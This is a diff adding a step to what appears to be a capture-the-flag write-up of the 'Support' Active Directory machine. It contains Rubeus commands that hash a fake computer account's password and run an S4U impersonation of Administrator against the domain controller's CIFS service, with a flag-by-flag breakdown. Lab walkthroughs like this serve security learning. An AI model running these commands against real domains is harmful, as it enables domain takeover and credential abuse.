@@ -1334,7 +1334,34 @@ UserPrincipalName                    :
 
 ### 4.8 Perform the S4U Attack with Rubeus
 
+With the DC configured to trust `FAKE-COMP01$`, Rubeus uses that account's Kerberos hash to request, via S4U, a service ticket impersonating `Administrator` to the DC's CIFS service.
 
+**Command:**
+
+```
+.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+```
+
+**Breakdown:**
+
+- `Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$`
+    - **Description:** Derives Kerberos key material from a plaintext password and account salt.
+    - **Purpose:** Produces the `rc4_hmac` key S4U needs to authenticate as `FAKE-COMP01$`.
+- `s4u /user:FAKE-COMP01$ /rc4:...`
+    - **Description:** Runs the S4U2self + S4U2proxy exchange as the fake computer.
+    - **Purpose:** Obtains a ticket on behalf of another user through the delegation just configured.
+- `/impersonateuser:Administrator`
+    - **Description:** The identity to impersonate.
+    - **Purpose:** Targets the Domain Admin account for full DC compromise.
+- `/msdsspn:cifs/dc.support.htb`
+    - **Description:** The service principal name to request the ticket for.
+    - **Purpose:** CIFS access to the DC is sufficient for a remote SYSTEM shell via PsExec.
+- `/ptt`
+    - **Description:** Pass-the-ticket — injects the ticket into the session.
+    - **Purpose:** Also prints the base64 ticket, which is exported to the attack host for use with Impacket.
+
+**Result:**
 <div align="center">
 <br>
 <br>
